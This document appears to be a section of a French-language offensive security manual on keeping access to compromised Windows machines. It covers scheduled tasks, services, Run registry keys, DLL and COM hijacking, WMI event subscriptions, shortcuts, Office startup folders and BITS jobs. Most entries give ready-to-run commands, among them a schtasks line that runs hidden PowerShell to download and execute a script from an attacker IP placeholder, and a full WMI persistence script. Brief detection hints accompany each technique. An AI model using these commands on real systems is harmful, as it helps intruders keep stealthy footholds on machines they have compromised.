# VII.A. Techniques de Persistance Locales

La persistance locale vise à maintenir l'accès à une machine spécifique compromise. Même si l'accès au domaine est perdu, un pied-à-terre sur une machine clé peut être suffisant pour relancer des opérations.

## 1. Tâches Planifiées (Scheduled Tasks)

*   **Description :** Créer une tâche qui s'exécute à intervalles réguliers, au démarrage, ou lors d'un événement spécifique pour lancer un payload.
*   **Outils / Commandes :**
    *   **`schtasks.exe` (Windows natif) :**
        ```batch
        # Créer une tâche qui lance un payload au démarrage du système
        schtasks /create /tn "MaPersistance" /tr "C:\chemin\vers\payload.exe" /sc ONSTART /ru SYSTEM
        # Créer une tâche qui se lance toutes les heures
        schtasks /create /tn "MaPersistanceHoraire" /tr "powershell.exe -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://<IP_ATTAQUANT>/payload.ps1')" /sc HOURLY /ru <UTILISATEUR_COMPROMIS> /rp <MOT_DE_PASSE_SI_NECESSAIRE>
        ```
    *   **PowerShell `Register-ScheduledTask` :**
        ```powershell
        $action = New-ScheduledTaskAction -Execute "C:\chemin\vers\payload.exe"
        $trigger = New-ScheduledTaskTrigger -AtLogon
        Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "PersistanceLogon" -User "SYSTEM" -RunLevel Highest
        ```
*   **Détection :** Surveiller la création de nouvelles tâches planifiées (Event ID 4698, 106), examiner les tâches existantes.

## 2. Services Windows

*   **Description :** Créer un nouveau service ou modifier un service existant pour qu'il exécute un code malveillant. Les services peuvent être configurés pour démarrer automatiquement.
*   **Outils / Commandes :**
    *   **`sc.exe` (Windows natif) :**
        ```batch
        # Créer un nouveau service
        sc create "MonServicePersistant" binPath= "C:\chemin\vers\payload_service.exe" start= auto DisplayName= "Mon Service Persistant"
        sc start "MonServicePersistant"
        # Modifier un service existant (attention, peut casser des fonctionnalités)
        # sc config "NomServiceExistant" binPath= "C:\chemin\vers\payload.exe"
        ```
    *   **PowerShell `New-Service` :**
        ```powershell
        New-Service -Name "PSPersistSvc" -BinaryPathName "C:\chemin\vers\payload_service.exe" -DisplayName "PowerShell Persistent Service" -StartupType Automatic
        Start-Service -Name "PSPersistSvc"
        ```
*   **Détection :** Surveiller la création de nouveaux services (Event ID 4697, 7045), examiner les configurations des services (binPath, etc.).

## 3. Clés de Registre (Run, RunOnce, etc.)

*   **Description :** Ajouter des entrées dans des clés de registre spécifiques qui sont exécutées au démarrage de Windows ou à l'ouverture de session d'un utilisateur.
*   **Clés Communes :**
    *   `HKLM\Software\Microsoft\Windows\CurrentVersion\Run`
    *   `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
    *   `HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce`
    *   `HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce`
    *   `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit` (plus risqué à modifier)
    *   `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell` (plus risqué à modifier)
*   **Outils / Commandes :**
    *   **`reg.exe` (Windows natif) :**
        ```batch
        reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "MaPersistanceRun" /t REG_SZ /d "C:\chemin\vers\payload.exe" /f
        ```
    *   **PowerShell `Set-ItemProperty` :**
        ```powershell
        Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "PSPersistRun" -Value "C:\chemin\vers\payload.exe"
        ```
*   **Détection :** Surveiller les modifications de ces clés de registre (Sysmon Event ID 12, 13, 14). Utiliser Autoruns de Sysinternals.

## 4. DLL Hijacking

*   **Description :** Placer une DLL malveillante avec le même nom qu'une DLL légitime dans un chemin où une application la chargera en premier.
*   **Scénarios :**
    *   Applications qui chargent des DLLs depuis leur répertoire courant avant les répertoires système.
    *   Applications avec des chemins de recherche de DLLs mal configurés.
*   **Outils :** Process Monitor (ProcMon) pour identifier les DLLs manquantes ou chargées depuis des chemins non standards.
*   **Détection :** Surveiller le chargement de DLLs depuis des emplacements inhabituels. Intégrité des fichiers.

## 5. WMI Event Subscriptions

*   **Description :** Créer un consommateur d'événements WMI permanent qui exécute une action (script, commande) en réponse à un événement WMI (ex: démarrage du système, connexion utilisateur, intervalle de temps).
*   **Composants :**
    *   **Event Filter :** Définit l'événement déclencheur.
    *   **Event Consumer :** Définit l'action à exécuter (ex: `ActiveScriptEventConsumer` pour VBS/JS, `CommandLineEventConsumer` pour des commandes).
    *   **FilterToConsumerBinding :** Lie le filtre au consommateur.
*   **Outils / Commandes :**
    *   **PowerShell :**
        ```powershell
        # Exemple (simplifié) pour exécuter un script VBS toutes les 5 minutes
        # Créer le filtre
        $FilterArgs = @{name='PersistFilter'; EventNamespace='root\cimv2'; QueryLanguage="WQL"; Query="SELECT * FROM __InstanceModificationEvent WITHIN 300 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 300 AND TargetInstance.SystemUpTime % 300 = 0"}
        $Filter=Set-WmiInstance -Class __EventFilter -Namespace root\subscription -Arguments $FilterArgs
        # Créer le consommateur (ActiveScriptEventConsumer)
        $ConsumerArgs = @{name='PersistConsumer'; ScriptingEngine='VBScript'; ScriptText='CreateObject("WScript.Shell").Run "calc.exe"'}
        $Consumer=Set-WmiInstance -Class ActiveScriptEventConsumer -Namespace root\subscription -Arguments $ConsumerArgs
        # Lier les deux
        Set-WmiInstance -Class __FilterToConsumerBinding -Namespace root\subscription -Arguments @{Filter=$Filter; Consumer=$Consumer} | Out-Null
        ```
    *   **Outils spécialisés :** `WMI_Persistence.ps1` (PowerSploit), `SharpWMI`.
*   **Détection :** Difficile. Examiner les objets WMI dans l'espace de noms `root\subscription`. Sysmon Event ID 19, 20, 21.

## 6. COM Hijacking (Component Object Model)

*   **Description :** Modifier des clés de registre COM pour rediriger l'appel d'un objet COM légitime vers un code malveillant.
*   **Clés typiques :** `HKCU\Software\Classes\CLSID\`, `HKLM\Software\Classes\CLSID\`
*   **Détection :** Surveiller les modifications des clés de registre COM. Utiliser Autoruns.

## 7. Raccourcis (.LNK) et Fichiers d'Aide (.CHM) Modifiés

*   **Description :** Modifier des fichiers `.LNK` (raccourcis) existants ou en créer de nouveaux pour qu'ils exécutent un payload en plus de leur action normale. Des fichiers `.CHM` malveillants peuvent aussi exécuter du code.
*   **Détection :** Vérifier les cibles des raccourcis, en particulier ceux dans les dossiers de démarrage ou sur le bureau.

## 8. Office Application Startup (Macros, Add-ins)

*   **Description :** Utiliser les fonctionnalités de démarrage d'applications Office (ex: `Word\STARTUP`, `Excel\XLSTART`, modèles avec macros auto-exécutables, add-ins malveillants).
*   **Détection :** Examiner les dossiers de démarrage Office, les add-ins installés, les paramètres de sécurité des macros.

## 9. Bits Jobs (Background Intelligent Transfer Service)

*   **Description :** Créer un job BITS qui télécharge et exécute un payload après un événement ou à un moment donné.
*   **Outils :** `bitsadmin.exe` (déprécié mais souvent présent), cmdlets PowerShell BITS (`Start-BitsTransfer`, `Add-BitsFile`, `Set-BitsTransfer -CompletionJob`).
*   **Détection :** Lister les jobs BITS (`bitsadmin /list /allusers`), surveiller l'utilisation de `bitsadmin.exe`.

Ces techniques peuvent être combinées et adaptées. La furtivité est souvent un objectif clé. 